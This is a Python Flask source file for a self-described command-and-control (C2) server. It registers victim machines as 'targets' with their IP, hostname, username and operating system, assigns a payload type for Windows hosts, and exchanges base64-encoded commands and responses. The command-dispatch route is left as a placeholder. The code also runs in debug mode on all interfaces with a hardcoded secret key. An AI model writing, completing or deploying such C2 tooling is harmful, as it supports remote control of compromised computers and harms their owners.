from flask import Flask, request, jsonify
from flask_cors import CORS
import base64
import threading
import time
from datetime import datetime
import socket

app = Flask(__name__)
CORS(app)
app.secret_key = 'your_secret_key'

targets = []
listener_counter = 0
kill_flag = 0

def comm_in(data):
    message_rec = base64.b64decode(data).decode('utf-8')
    return message_rec

def comm_out(message):
    message = base64.b64encode(bytes(message, encoding='utf8')).decode('utf-8')
    return message

@app.route('/')
def index():
    return "C2 Server is running."

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    remote_ip = request.remote_addr
    username = comm_in(data['username'])
    op_sys = comm_in(data['os'])
    pay_val = 1 if 'Windows' in op_sys else 2
    cur_time = time.strftime("%H:%M:%S", time.localtime())
    date = datetime.now()
    time_record = f"{date.month}/{date.day}/{date.year} {cur_time}"
    host_name = socket.gethostbyaddr(remote_ip)[0] if socket.gethostbyaddr(remote_ip) else remote_ip
    targets.append([remote_ip, f"{host_name}@{remote_ip}", time_record, username, op_sys, pay_val, 'Active'])
    return jsonify({"message": "Registered successfully."})

@app.route('/command/<target_ip>', methods=['POST'])
def send_command(target_ip):
    data = request.json
    command = comm_out(data['command'])
    target = next((t for t in targets if t[0] == target_ip), None)
    if not target:
        return jsonify({"error": "Target not found"}), 404

    # Send command to target
    # This is a placeholder for actual command execution
    # You would need to store the command somewhere the client can poll for it
    return jsonify({"message": "Command sent"})


@app.route('/response/<target_ip>', methods=['POST'])
def get_response(target_ip):
    data = request.json
    response = comm_in(data['response'])
    # Process response from target
    return jsonify({"message": "Response received", "response": response})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
